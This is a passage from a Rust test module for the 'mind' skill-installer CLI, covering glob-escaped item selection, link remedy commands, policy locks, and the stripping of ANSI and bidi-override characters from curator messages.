        let escaped = format!("skill:{}", glob::Pattern::escape("pdf[x]"));
        let matched = learn_pattern_targets(&items, "s", &escaped).unwrap();
        assert_eq!(matched, vec![target("s", "skill:pdf[x]")]);
        assert_eq!(
            exact_index(&items, &matched[0]),
            Some(0),
            "the selection must resolve back to `pdf[x]`, not `pdfx`"
        );
        // A `#`-carrying name is reachable only by a glob (a `#` in the pattern
        // itself is refused as a source-qualified ref), and its selection must
        // still resolve to that item.
        let matched = learn_pattern_targets(&items, "s", "skill:x*").unwrap();
        assert_eq!(matched, vec![target("s", "skill:x#skill:review")]);
        assert_eq!(
            exact_index(&items, &matched[0]),
            Some(2),
            "the `#`-carrying selection must resolve to its own item"
        );
        // The failure the identity carry exists to prevent: that same key,
        // joined into `<source>#<key>` and split on the last `#` the way the
        // ref round trip did, names a DIFFERENT item that also exists.
        let joined = matched[0].display();
        let (_src, key) = joined.rsplit_once('#').unwrap();
        assert_eq!(
            key, "skill:review",
            "the joined spelling really is ambiguous: {joined}"
        );
        assert_ne!(
            exact_index(&items, &matched[0]),
            exact_index(&items, &target("s", "skill:review")),
            "the two readings must be different items"
        );
    }

    /// The pattern forms `--learn` refuses, each with its own reason.
    // spec: CLI-236
    #[test]
    fn learn_pattern_rejects_unusable_values() {
        let items = vec![catalog_skill("review", "github.com/o/r", None)];
        let reason = |p: &str| match learn_pattern_targets(&items, "github.com/o/r", p) {
            Err(MindError::InvalidLearnPattern { reason, .. }) => reason,
            other => panic!("expected InvalidLearnPattern for {p:?}, got {other:?}"),
        };
        assert!(reason("").contains("empty"));
        assert!(reason("   ").contains("empty"));
        assert!(reason("other/repo#review").contains("selects within the source being melded"));
        assert!(reason("[bad").contains("not a valid glob"));
    }

    /// An item name carrying glob metacharacters cannot turn the remedy mind
    /// prints into a pattern that matches some OTHER item, and the pattern it
    /// prints is driven through the whole selection path, not just composed.
    // spec: LNK-18 CLI-236
    #[test]
    fn link_remedy_escapes_glob_metacharacters_in_an_item_name() {
        let remedy = link_meld_remedy(
            "local/t/repo#skills/pdf[x]",
            "/tmp/repo",
            "pdf[x]",
            ItemKind::Skill,
            None,
        );
        assert!(
            !remedy.contains("--learn 'pdf[x]'") && !remedy.contains("--learn 'skill:pdf[x]'"),
            "the raw name would be read as a glob: {remedy}"
        );
        // And it must drop the link instance first, or the meld it suggests
        // collides with the skill the link already installed.
        //
        // spec: CLI-28 -- the IDENTITY is glob-escaped for the same reason the
        // pattern is: `unmeld`'s selector is glob-aware, and a link identity
        // embeds the skill's repo path (LNK-4), so the raw
        // `local/t/repo#skills/pdf[x]` compiles as a pattern that matches no
        // source and stops the remedy at its first command.
        let escaped_id = glob::Pattern::escape("local/t/repo#skills/pdf[x]");
        assert!(
            remedy.starts_with(&format!("mind unmeld '{escaped_id}' --yes && mind meld ")),
            "the remedy must unmeld the link instance first, by an escaped selector: {remedy}"
        );
        assert!(
            crate::resolve::source_matches_glob("local/t/repo#skills/pdf[x]", &escaped_id),
            "the escaped selector must still resolve to the instance it names"
        );
        assert!(
            !crate::resolve::source_matches_glob(
                "local/t/repo#skills/pdf[x]",
                "local/t/repo#skills/pdf[x]"
            ),
            "the unescaped selector really does fail to match, which is why it is escaped"
        );
        // Both halves carry --yes, or a non-TTY paste unmelds and installs
        // nothing while still exiting 0.
        assert_eq!(
            remedy.matches("--yes").count(),
            2,
            "both halves of the remedy must be non-interactive: {remedy}"
        );
        // The escaped pattern the remedy emits still selects the literal name,
        // and only it: the raw name would have selected `pdfx` instead. And the
        // selection it produces is resolved by identity, so the metacharacters
        // are not read as a glob a second time on the way in.
        let items = vec![
            catalog_skill("pdf[x]", "s", None),
            catalog_skill("pdfx", "s", None),
            // An agent of the same name: a bare (kind-less) pattern would drag
            // it into the install alongside the skill (L1).
            CatalogItem {
                kind: ItemKind::Agent,
                ..catalog_skill("pdf[x]", "s", None)
            },
        ];
        let escaped = format!("skill:{}", glob::Pattern::escape("pdf[x]"));
        assert!(
            remedy.contains(&format!("--learn '{escaped}'")),
            "the remedy must carry the kind-qualified, escaped pattern: {remedy}"
        );
        let matched = learn_pattern_targets(&items, "s", &escaped).unwrap();
        assert_eq!(matched, vec![target("s", "skill:pdf[x]")]);
        assert_eq!(
            exact_index(&items, &matched[0]),
            Some(0),
            "the remedy's own selection must resolve to the linked skill"
        );
        // Without the `skill:` qualifier the same pattern also drags in the
        // same-named agent, which is prompt content the user never asked for.
        assert_eq!(
            learn_pattern_targets(&items, "s", &glob::Pattern::escape("pdf[x]"))
                .unwrap()
                .len(),
            2,
            "the kind qualifier is what keeps the agent out"
        );
        // And the unescaped name really would have selected the other item.
        assert_eq!(
            learn_pattern_targets(&items, "s", "skill:pdf[x]").unwrap(),
            vec![target("s", "skill:pdfx")],
            "the unescaped name really would have selected the other item"
        );
    }

    /// The two remedy forms differ only by `--add-root .`, which is what makes
    /// the meld half work for a repo whose inventory does not offer the linked
    /// skill (the case item links exist for). Without it that half fails AFTER
    /// the unmeld half already ran.
    // spec: LNK-18 DSC-84
    #[test]
    fn link_remedy_adds_a_scan_root_when_a_plain_meld_would_not_reach_the_skill() {
        let plain = link_meld_remedy(
            "local/t/repo#skills/review",
            "/tmp/repo",
            "review",
            ItemKind::Skill,
            None,
        );
        let rooted = link_meld_remedy(
            "local/t/repo#skills/review",
            "/tmp/repo",
            "review",
            ItemKind::Skill,
            Some(&link_add_root("skills/review", ItemKind::Skill)),
        );
        assert_eq!(
            plain,
            "mind unmeld 'local/t/repo#skills/review' --yes && \
             mind meld '/tmp/repo' --learn 'skill:review' --yes"
        );
        assert_eq!(
            rooted,
            "mind unmeld 'local/t/repo#skills/review' --yes && \
             mind meld '/tmp/repo' --add-root '.' --learn 'skill:review' --yes"
        );
    }

    /// The `--add-root` value is derived from the linked path, because an added
    /// root is convention-scanned only one level deep: a fixed `.` reaches a
    /// skill at `<repo-root>/skills/<name>` and nothing deeper, so the meld half
    /// of the remedy would fail after the unmeld half had already run.
    // spec: LNK-18 DSC-84
    #[test]
    fn link_add_root_names_the_directory_the_scan_must_start_from() {
        // The containered layout at the repo root: the whole clone.
        assert_eq!(link_add_root("skills/review", ItemKind::Skill), ".");
        // A flat skill at the repo root: also the whole clone.
        assert_eq!(link_add_root("review", ItemKind::Skill), ".");
        // Containered, but nested: the parent of the `skills/` container, not
        // the container itself (which would make the skill a grandchild).
        assert_eq!(
            link_add_root("vendor/pkg/skills/review", ItemKind::Skill),
            "vendor/pkg"
        );
        // Flat, but nested: the skill's own parent.
        assert_eq!(link_add_root("vendor/review", ItemKind::Skill), "vendor");
        // A directory that merely ends in something skills-like is not the
        // container, so it is treated as the flat parent.
        assert_eq!(
            link_add_root("my-skills/review", ItemKind::Skill),
            "my-skills"
        );
    }

    // ----- LNK-18: the reachability probe behind the two remedy forms -----

    /// A scratch clone directory plus the linked-source record that points into
    /// it, wired so `clone_dir` resolves to the directory itself (a local
    /// source at its default pin is read live from `url`, CLI-27).
    fn link_source_at(dir: &std::path::Path, item_path: &str) -> crate::source::Source {
        crate::source::Source {
            name: format!("local/test/repo#{item_path}"),
            url: dir.to_string_lossy().into_owned(),
            host: "local".to_string(),
            owner: "test".to_string(),
            repo: "repo".to_string(),
            commit: None,
            description: None,
            alias: None,
            as_alias: None,
            pin: Pin::default(),
            roots: None,
            flat_skills: false,
            add_roots: None,
            item_path: Some(item_path.to_string()),
            item_kind: None,
            curated_by: None,
            origin: None,
            plugin_version: None,
            install_hooks: Vec::new(),
            install_hook: None,
            install_hook_commit: None,
        }
    }

    fn scratch(tag: &str) -> std::path::PathBuf {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!("mind-{tag}-{}-{n}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn write_file_at(path: &std::path::Path, contents: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, contents).unwrap();
    }

    /// The whole point of deciding reachability BY PATH: a repo whose
    /// authoritative inventory declares a DIFFERENT skill under the SAME bare
    /// name as the linked one must answer "not reachable", so the remedy adds a
    /// scan root instead of quietly melding the decoy.
    // spec: LNK-18 DSC-84
    #[test]
    fn plain_meld_reaches_link_answers_by_path_not_by_bare_name() {
        let dir = scratch("lnk18-bypath");
        let paths = Paths {
            mind_home: dir.join("mind"),
            claude_home: dir.join("claude"),
        };
        write_file_at(
            &dir.join("skills/review/SKILL.md"),
            "---\ndescription: the linked one\n---\n# review\n",
        );
        write_file_at(
            &dir.join("vendor/review/SKILL.md"),
            "---\ndescription: a decoy of the same bare name\n---\n# review\n",
        );
        // Authoritative: convention discovery is off and the only `review` the
        // whole-repo scan offers is the one at `vendor/review`.
        write_file_at(
            &dir.join("mind.toml"),
            "[[items]]\nkind = \"skill\"\nname = \"review\"\npath = \"vendor/review\"\n",
        );
        let source = link_source_at(&dir, "skills/review");
        assert!(
            !plain_meld_reaches_link(&paths, &source, ItemKind::Skill),
            "a same-named skill at a DIFFERENT path must not count as reachable, \
             or the remedy would install the decoy"
        );

        // Drop the authoritative inventory and the ordinary convention scan
        // finds the skill at the very path the link points at.
        std::fs::remove_file(dir.join("mind.toml")).unwrap();
        assert!(
            plain_meld_reaches_link(&paths, &source, ItemKind::Skill),
            "a plain convention layout really is reachable, so the plain remedy \
             form must still be chosen for it"
        );

        // A source that is not a link instance at all short-circuits to true
        // (there is nothing to reconcile, so no remedy is ever composed).
        let ordinary = crate::source::Source {
            item_path: None,
            item_kind: None,
            curated_by: None,
            ..source.clone()
        };
        assert!(plain_meld_reaches_link(&paths, &ordinary, ItemKind::Skill));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The probe is a hint, not a gate: any error from the whole-clone scan
    /// answers "not reachable" rather than propagating, so a link install never
    /// fails because of a repo-wide scan problem it does not care about.
    // spec: LNK-18
    #[test]
    fn plain_meld_reaches_link_treats_a_failed_scan_as_not_reachable() {
        let dir = scratch("lnk18-scanfail");
        let paths = Paths {
            mind_home: dir.join("mind"),
            claude_home: dir.join("claude"),
        };
        // The clone is gone: `scan_source_at` reports `LinkedSourceGone`
        // (CLI-212). The probe must swallow it and answer "not reachable",
        // which selects the `--add-root` form -- the form that also works on a
        // repo a plain meld would have discovered anyway (DSC-85).
        let missing = dir.join("no-such-clone");
        let source = link_source_at(&missing, "skills/review");
        assert!(
            !plain_meld_reaches_link(&paths, &source, ItemKind::Skill),
            "an unreadable clone must answer 'not reachable', not propagate"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ----- LNK-18: which files the pre-install token scan reads -----

    /// The scan reads exactly what install expands: every markdown file
    /// (NS-53) plus the non-markdown files the item lists in `expand:` (NS-57).
    /// A wider set would raise `LinkRefUnsatisfiable` for a token install never
    /// touches; a narrower one would let a real token through to the blunt
    /// error LNK-18 exists to replace.
    // spec: LNK-18
    #[test]
    fn expandable_files_reads_markdown_and_expand_listed_files_only() {
        let dir = scratch("lnk18-expandable");
        let skill = dir.join("skills/review");
        write_file_at(&skill.join("SKILL.md"), "# review\n");
        write_file_at(&skill.join("docs/notes.md"), "nested markdown\n");
        write_file_at(&skill.join("run.py"), "# {{ns:dev}}\n");
        write_file_at(&skill.join("data/blob.bin"), "not expanded\n");

        let item = CatalogItem {
            path: skill.clone(),
            expand: vec!["run.py".to_string()],
            ..link_skill("review", vec![])
        };
        let mut got: Vec<String> = expandable_files(&item)
            .unwrap()
            .iter()
            .map(|p| {
                p.strip_prefix(&skill)
                    .unwrap()
                    .to_string_lossy()
                    .into_owned()
            })
            .collect();
        got.sort();
        assert_eq!(
            got,
            vec!["SKILL.md", "docs/notes.md", "run.py"],
            "markdown at any depth plus the expand:-listed file, and nothing else"
        );

        // Without the `expand:` entry the same non-markdown file drops out, so
        // the token inside it is (correctly) not the link's problem.
        let unlisted = CatalogItem {
            expand: Vec::new(),
            ..item.clone()
        };
        assert!(
            !expandable_files(&unlisted)
                .unwrap()
                .iter()
                .any(|p| p.ends_with("run.py")),
            "a non-markdown file the item does not list is not expanded, so it \
             must not be scanned either"
        );

        // A single-FILE item (an agent or rule) has no bundled tree: only its
        // own path applies, and only when it is markdown.
        let single = CatalogItem {
            kind: ItemKind::Agent,
            path: skill.join("run.py"),
            expand: vec!["run.py".to_string()],
            ..link_skill("review", vec![])
        };
        assert!(
            expandable_files(&single).unwrap().is_empty(),
            "a non-markdown single-file item has nothing install would expand"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The pre-install scan walks the item tree with the SAME capped walker the
    /// install path uses, so a pathological tree gives the structured LIFE-52
    /// error instead of a silent empty scan (which would let a token slip
    /// through) or an unbounded recursion.
    // spec: LIFE-52 LNK-18
    #[test]
    fn expandable_files_depth_caps_a_pathological_item_tree() {
        let dir = scratch("lnk18-deep");
        let skill = dir.join("skills/review");
        let mut deep = skill.clone();
        for _ in 0..(install::MAX_ITEM_TREE_DEPTH + 2) {
            deep.push("d");
        }
        std::fs::create_dir_all(&deep).unwrap();
        write_file_at(&skill.join("SKILL.md"), "# review\n");

        let item = CatalogItem {
            path: skill,
            ..link_skill("review", vec![])
        };
        let err = expandable_files(&item).expect_err("the cap must be enforced");
        assert!(
            err.to_string().contains("nested directories"),
            "the depth cap must surface as the structured LIFE-52 error: {err}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The miss half of the exact-selection lookup. Unreachable in practice --
    /// the target is composed from the very catalog it is looked up in, one
    /// statement earlier -- but it is what stops a future caller that composes
    /// a target from a stale scan from silently installing the wrong item.
    // spec: CLI-236
    #[test]
    fn exact_index_misses_a_target_that_is_not_in_the_catalog() {
        let items = vec![
            catalog_skill("review", "s", None),
            catalog_skill("review", "other", None),
        ];
        assert_eq!(exact_index(&items, &target("s", "skill:review")), Some(0));
        // Right key, wrong source: identity is the PAIR, so this is a miss and
        // not a fallback onto the same-named item of another source.
        assert_eq!(exact_index(&items, &target("nope", "skill:review")), None);
        // Right source, wrong kind: `key()` is kind-qualified.
        assert_eq!(exact_index(&items, &target("s", "agent:review")), None);
        // Right source, unknown name.
        assert_eq!(exact_index(&items, &target("s", "skill:absent")), None);
    }

    /// On a unix host the platform guard is a no-op, so an item install is not
    /// refused (LIFE-50). The non-unix refusal branch is `#[cfg(not(unix))]` and
    /// cannot run in CI here; this pins the supported-platform half of the
    /// contract. The ID is cited by this test, so no allowlist entry is needed.
    // spec: LIFE-50
    #[cfg(unix)]
    #[test]
    fn require_link_platform_is_ok_on_unix() {
        let paths = Paths {
            mind_home: PathBuf::from("/tmp/mind-life50"),
            claude_home: PathBuf::from("/tmp/claude-life50"),
        };
        assert!(
            require_link_platform(&paths).is_ok(),
            "the platform guard must be a no-op on unix"
        );
    }

    // ----- DSC-69: auth-failure message rendering -----

    #[test]
    fn auth_failure_skip_lines_no_message() {
        // spec: DSC-69 -- skip action produces standard line + " (skipping)"
        use crate::mindfile::OnAuthFailure;
        let cfg = OnAuthFailure {
            action: AuthFailureAction::Skip,
            message: None,
        };
        let lines = auth_failure_lines("owner/private-repo", &cfg);
        assert_eq!(lines.len(), 1);
        assert!(
            lines[0].contains("unable to meld source owner/private-repo"),
            "line: {}",
            lines[0]
        );
        assert!(
            lines[0].contains("(skipping)"),
            "must include (skipping) for skip action: {}",
            lines[0]
        );
    }

    #[test]
    fn auth_failure_skip_lines_with_message() {
        // spec: DSC-69 -- message is printed on the line immediately following
        use crate::mindfile::OnAuthFailure;
        let cfg = OnAuthFailure {
            action: AuthFailureAction::Skip,
            message: Some("Configure credentials: https://example.com/auth".into()),
        };
        let lines = auth_failure_lines("owner/private-repo", &cfg);
        assert_eq!(lines.len(), 2);
        assert!(lines[0].contains("(skipping)"), "first line: {}", lines[0]);
        assert_eq!(lines[1], "Configure credentials: https://example.com/auth");
    }

    #[test]
    fn auth_failure_error_lines_no_skipping_suffix() {
        // spec: DSC-69 -- error action does NOT have " (skipping)" in the message
        use crate::mindfile::OnAuthFailure;
        let cfg = OnAuthFailure {
            action: AuthFailureAction::Error,
            message: None,
        };
        let lines = auth_failure_lines("owner/private-repo", &cfg);
        assert_eq!(lines.len(), 1);
        assert!(
            lines[0].contains("unable to meld source"),
            "line: {}",
            lines[0]
        );
        assert!(
            !lines[0].contains("(skipping)"),
            "error action must NOT include (skipping): {}",
            lines[0]
        );
    }

    #[test]
    fn auth_failure_error_lines_with_message_included() {
        // spec: DSC-69 -- message is printed before the process exits non-zero
        use crate::mindfile::OnAuthFailure;
        let cfg = OnAuthFailure {
            action: AuthFailureAction::Error,
            message: Some("Contact admin for access.".into()),
        };
        let lines = auth_failure_lines("owner/private-repo", &cfg);
        assert_eq!(lines.len(), 2);
        assert!(
            !lines[0].contains("(skipping)"),
            "error action must NOT include (skipping)"
        );
        assert_eq!(lines[1], "Contact admin for access.");
    }

    #[test]
    fn auth_failure_lines_strips_ansi_escape() {
        // spec: DSC-69 -- ANSI escape bytes in message are stripped before output
        use crate::mindfile::OnAuthFailure;
        let cfg = OnAuthFailure {
            action: AuthFailureAction::Skip,
            message: Some("\x1b[2J hello\x1b[0m".into()),
        };
        let lines = auth_failure_lines("src", &cfg);
        assert_eq!(lines.len(), 2);
        // ANSI bytes are stripped; only printable characters remain.
        assert_eq!(
            lines[1], " hello",
            "expected printable portion only: {:?}",
            lines[1]
        );
        assert!(
            !lines[1].contains('\x1b'),
            "ANSI escape must be stripped: {:?}",
            lines[1]
        );
    }

    #[test]
    fn strip_ansi_drops_bidi_and_separator_chars() {
        // spec: DSC-69 -- bidi-override code points and line/paragraph separators
        // are dropped so a curator-controlled message cannot spoof terminal output.

        // U+202E (RIGHT-TO-LEFT OVERRIDE) is the canonical bidi-spoof char.
        assert_eq!(
            strip_ansi("pay \u{202E}oot"),
            "pay oot",
            "RLO must be dropped"
        );
        // Full blocked range U+202A-U+202E.
        assert_eq!(
            strip_ansi("\u{202A}\u{202B}\u{202C}\u{202D}\u{202E}"),
            "",
            "bidi U+202A-202E must all be dropped"
        );
        // Full blocked range U+2066-U+2069.
        assert_eq!(
            strip_ansi("\u{2066}\u{2067}\u{2068}\u{2069}"),
            "",
            "isolate U+2066-2069 must all be dropped"
        );
        // U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR).
        assert_eq!(
            strip_ansi("line\u{2028}break"),
            "linebreak",
            "U+2028 must be dropped"
        );
        assert_eq!(
            strip_ansi("para\u{2029}sep"),
            "parasep",
            "U+2029 must be dropped"
        );
        // Plain ASCII and non-blocked Unicode are still passed through.
        assert_eq!(strip_ansi("hello\u{00e9}"), "hello\u{00e9}");
    }

    #[test]
    fn strip_ansi_preserves_chars_adjacent_to_blocked_ranges() {
        // spec: DSC-69 -- the blocked sets are the exact ranges U+202A-U+202E,
        // U+2066-U+2069, and the two separators U+2028/U+2029. Codepoints
        // immediately adjacent to those ranges are legitimate text and must pass
        // through; a widened range would be a regression that silently eats
        // normal content.

        // U+2027 (HYPHENATION POINT) sits just below the 2028/2029 separators.
        assert_eq!(
            strip_ansi("a\u{2027}b"),
            "a\u{2027}b",
            "U+2027 must pass through (below the separator block)"
        );
        // U+202F (NARROW NO-BREAK SPACE) sits just above the U+202A-202E block.
        assert_eq!(
            strip_ansi("a\u{202F}b"),
            "a\u{202F}b",
            "U+202F must pass through (above the bidi-override block)"
        );
        // U+2065 sits just below the U+2066-2069 isolate block.
        assert_eq!(
            strip_ansi("a\u{2065}b"),
            "a\u{2065}b",
            "U+2065 must pass through (below the isolate block)"
        );
        // U+206A-206F (the deprecated format controls) are themselves blocked by
        // NS-73, so the first pass-through code point above the isolate block is
        // U+2070.
        assert_eq!(
            strip_ansi("a\u{206A}b"),
            "ab",
            "U+206A is a deprecated format control and must be dropped (NS-73)"
        );
        assert_eq!(
            strip_ansi("a\u{2070}b"),
            "a\u{2070}b",
            "U+2070 must pass through (above the deprecated-format block)"
        );
    }

    #[test]
    fn strip_ansi_separator_at_every_position() {
        // spec: DSC-69 -- a separator must be dropped regardless of where it
        // appears: leading, interior, or trailing.
        assert_eq!(strip_ansi("\u{2028}tail"), "tail", "leading U+2028");
        assert_eq!(strip_ansi("mid\u{2028}dle"), "middle", "interior U+2028");
        assert_eq!(strip_ansi("head\u{2028}"), "head", "trailing U+2028");
        // A run consisting solely of separators collapses to empty.
        assert_eq!(
            strip_ansi("\u{2028}\u{2029}\u{2028}"),
            "",
            "only-separator run must be empty"
        );
    }

    #[test]
    fn strip_ansi_alternating_blocked_and_allowed() {
        // spec: DSC-69 -- interleaving blocked codepoints with allowed text must
        // drop only the blocked ones and keep the rest in order.
        assert_eq!(
            strip_ansi("a\u{202E}b\u{2066}c\u{2028}d\u{2069}e"),
            "abcde",
            "blocked chars removed, allowed text preserved in order"
        );
    }

    // CLI-153: the mutating-verb JSON result has the stable
    // action/target/outcome shape; optional fields appear only when populated.
    #[test]
    fn mutation_result_minimal_shape() {
        let r = MutationResult::new("forget", "skill:review", "removed");
        let v: serde_json::Value = serde_json::to_value(&r).unwrap();
        assert_eq!(v["action"], "forget");
        assert_eq!(v["target"], "skill:review");
        assert_eq!(v["outcome"], "removed");
        // Unpopulated optional fields are omitted entirely.
        assert!(v.get("count").is_none(), "count must be omitted: {v}");
        assert!(v.get("installed").is_none(), "installed omitted: {v}");
        assert!(v.get("removed").is_none(), "removed omitted: {v}");
    }

    #[test]
    fn mutation_result_populated_optional_fields() {
        let mut r = MutationResult::new("learn", "skill:review", "installed");
        r.installed = vec!["agent:reviewer".to_string(), "skill:review".to_string()];
        r.count = Some(2);
        let v: serde_json::Value = serde_json::to_value(&r).unwrap();
        assert_eq!(v["action"], "learn");
        assert_eq!(v["outcome"], "installed");
        assert_eq!(v["count"], 2);
        assert_eq!(
            v["installed"],
            serde_json::json!(["agent:reviewer", "skill:review"])
        );
        // `removed` is still empty, so it is omitted.
        assert!(v.get("removed").is_none(), "empty removed omitted: {v}");
    }

    #[test]
    fn parse_confirm_default_no_only_yes_confirms() {
        // spec: CLI-42 - the default-no guard (e.g. the forget glob confirm):
        // only an explicit yes confirms; empty and unrecognized are no.
        assert!(parse_confirm("y", false));
        assert!(parse_confirm("YES", false));
        assert!(!parse_confirm("", false));
        assert!(!parse_confirm("n", false));
        assert!(!parse_confirm("maybe", false));
    }

    #[test]
    fn parse_confirm_default_yes_only_no_declines() {
        // spec: CLI-23 - the meld install prompt defaults to yes: a bare Enter (or
        // anything but an explicit no) installs; only n/no declines.
        assert!(parse_confirm("", true));
        assert!(parse_confirm("y", true));
        assert!(parse_confirm(" Y \n", true));
        assert!(parse_confirm("whatever", true));
        assert!(!parse_confirm("n", true));
        assert!(!parse_confirm("NO", true));
    }

    /// Write `policy_toml` to a temp file and point `$MIND_POLICY_FILE` at it,
    /// also clearing `$MIND_AGENT_HOMES` so the outer env never bleeds in.
    /// Returns the held env guard (drop last) and the base temp dir.
    fn with_policy(policy_toml: &str) -> (std::sync::MutexGuard<'static, ()>, PathBuf) {
        let guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let base = std::env::temp_dir().join(format!("mind-cmd-test-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&base).unwrap();
        let policy_file = base.join("policy.toml");
        std::fs::write(&policy_file, policy_toml).unwrap();
        // SAFETY: ENV_LOCK is held, so no other test reads env concurrently.
        unsafe {
            std::env::remove_var("MIND_AGENT_HOMES");
            std::env::set_var("MIND_POLICY_FILE", policy_file.to_str().unwrap());
        }
        (guard, base)
    }

    fn item(name: &str, source: &str) -> InstalledItem {
        InstalledItem {
            kind: ItemKind::Skill,
            name: name.to_string(),
            bare_name: name.to_string(),
            source: source.to_string(),
            commit: "deadbeef".to_string(),
            hash: "h".to_string(),
            store: format!("store/skills/{name}"),
            links: vec![],
            description: None,
            install_hooks: Vec::new(),
            dropped_requires: Vec::new(),
        }
    }

    // ---- F2: POL-40 override-note suppression --------------------------------

    // spec: POL-40
    // The override note is shown only when the env var is set AND actually takes
    // effect. Under a lobe lock the env var is ignored, so suppress it.
    #[test]
    fn pol40_override_note_predicate() {
        // Unlocked: env var set -> show the note (behavior unchanged).
        assert!(show_override_note(true, false));
        // Locked: env var ignored by agent_homes -> suppress the note.
        assert!(!show_override_note(true, true));
        // Env var unset -> never show, locked or not.
        assert!(!show_override_note(false, false));
        assert!(!show_override_note(false, true));
    }

    // spec: POL-40
    // End-to-end against a real `$MIND_POLICY_FILE`: with `[lobes].lock = true`
    // the loaded policy reports lobes_lock(), so the override note must be
    // suppressed even though `$MIND_AGENT_HOMES` is set. Drives the same
    // `Policy::load()?` + `lobes_lock()` path `lobe_list` uses.
    #[test]
    fn pol40_locked_policy_suppresses_override_note() {
        let managed = std::env::temp_dir().join("mind-pol40-managed-target");
        let policy_toml = format!(
            "[lobes]\nlock = true\ntargets = [\"{}\"]\n",
            managed.display()
        );
        let (_guard, base) = with_policy(&policy_toml);
        // Simulate the user setting the override var (ignored under lock).
        // SAFETY: ENV_LOCK held.
        unsafe {
            std::env::set_var("MIND_AGENT_HOMES", base.join("env-lobe").to_str().unwrap());
        }

        let policy = Policy::load().unwrap().expect("policy should load");
        let env_set = std::env::var_os("MIND_AGENT_HOMES").is_some();
        let lobes_locked = policy.lobes_lock();

        // SAFETY: ENV_LOCK held.
        unsafe {
            std::env::remove_var("MIND_AGENT_HOMES");
        }

        assert!(env_set, "test must have the override var set");
        assert!(lobes_locked, "policy must report a lobe lock");
        assert!(
            !show_override_note(env_set, lobes_locked),
            "POL-40: a locked policy must suppress the false override note"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // spec: POL-40
    // With a policy present but lobes unlocked (lock = false), the override note
    // is still shown when the env var is set: the env var really does take
    // effect, so the fix must not change the unlocked path.
    #[test]
    fn pol40_unlocked_keeps_override_note() {
        let policy_toml = "[lobes]\nlock = false\n";
        let (_guard, base) = with_policy(policy_toml);
        // SAFETY: ENV_LOCK held.
        unsafe {
            std::env::set_var("MIND_AGENT_HOMES", base.join("env-lobe").to_str().unwrap());
        }

        let lobes_locked = matches!(Policy::load().unwrap(), Some(p) if p.lobes_lock());
        let env_set = std::env::var_os("MIND_AGENT_HOMES").is_some();

        // SAFETY: ENV_LOCK held.
        unsafe {
            std::env::remove_var("MIND_AGENT_HOMES");
        }

        assert!(!lobes_locked, "lock = false means no lobe lock");
        assert!(
            show_override_note(env_set, lobes_locked),
            "unlocked behavior must be unchanged: the note still shows"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // ---- F3: POL-12 scoped-upgrade skip ordering -----------------------------

    /// A registry holding exactly the given repo specs, so
    /// `upgrade_item_disposition` can resolve a recorded source name to its
    /// structural base identity (POL-68) the way it does in production.
    fn registry_of(specs: &[&str]) -> Registry {
        Registry {
            sources: specs
                .iter()
                .map(|s| crate::source::parse_spec(s).unwrap())
                .collect(),
        }
    }

    // spec: POL-12
    // A scoped `upgrade <item>` must apply the item-ref filter before the policy
    // skip, so an out-of-scope item from a disallowed source produces no skip
    // line. The pre-fix ordering (policy skip first) would classify it as
    // PolicyBlocked and print a skip line for a source the user never selected.
    #[test]
    fn pol12_scoped_upgrade_no_skip_for_out_of_scope_source() {
        // Locked allowlist that permits only `allowed-src`.
        let policy_toml = concat!(
            "[sources]\n",
            "lock = true\n",
            "allow = [\"github.com/me/allowed-src\"]\n",
        );
        let (_guard, base) = with_policy(policy_toml);
        let policy = Policy::load().unwrap().expect("policy should load");
        assert!(policy.lock());

        // The user scopes to an item from the allowed source.
        let selected = item("wanted", "github.com/me/allowed-src");
        // An installed item from a *disallowed* source the user did NOT select.
        let other = item("unwanted", "github.com/them/blocked-src");

        let filter = parse_item_ref("wanted").unwrap();
        let registry = registry_of(&["me/allowed-src", "them/blocked-src"]);

        // Out-of-scope item: silently skipped, never reported as PolicyBlocked.
        assert_eq!(
            upgrade_item_disposition(&other, Some(&filter), None, None, Some(&policy), &registry),
            UpgradeDisposition::OutOfScope,
            "POL-12: an unselected item must not be policy-skipped (no skip line)"
        );
        // The selected, allowed item is considered for upgrade.
        assert_eq!(
            upgrade_item_disposition(
                &selected,
                Some(&filter),
                None,
                None,
                Some(&policy),
                &registry
            ),
            UpgradeDisposition::Consider,
        );

        // Sanity: with no scope filter, the disallowed item IS policy-blocked
        // (the existing unscoped behavior is preserved).
        assert_eq!(
            upgrade_item_disposition(&other, None, None, None, Some(&policy), &registry),
            UpgradeDisposition::PolicyBlocked,
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // POL-68: an installed item records its source as an *instance* identity,
    // which may carry an item-link `#path` and/or `@alias` suffix. The
    // disposition check must resolve that name through the registry to the
    // structural base identity, so a locked policy that admitted the repo keeps
    // admitting its instances, while an unregistered name fails closed.
    // spec: POL-68
    #[test]
    fn upgrade_disposition_resolves_instance_names_to_base_identity() {
        let policy_toml = concat!(
            "[sources]\n",
            "lock = true\n",
            "allow = [\"github.com/me/allowed-src\"]\n",
        );
        let (_guard, base) = with_policy(policy_toml);
        let policy = Policy::load().unwrap().expect("policy should load");

        // A link instance and an aliased instance of the allowed repo, both
        // registered under their extended identities.
        let mut registry = Registry::default();
        let link =
            crate::source::parse_spec("https://github.com/me/allowed-src/tree/main/skills/foo")
                .unwrap();
        assert_eq!(link.name, "github.com/me/allowed-src#skills/foo");
        let mut aliased = crate::source::parse_spec("me/allowed-src").unwrap();
        aliased.apply_alias(Some("fork".into()));
        assert_eq!(aliased.name, "github.com/me/allowed-src@fork");
        let link_name = link.name.clone();
        let aliased_name = aliased.name.clone();
        registry.sources.push(link);
        registry.sources.push(aliased);

        for name in [&link_name, &aliased_name] {
            assert_eq!(
                upgrade_item_disposition(
                    &item("foo", name),
                    None,
                    None,
                    None,
                    Some(&policy),
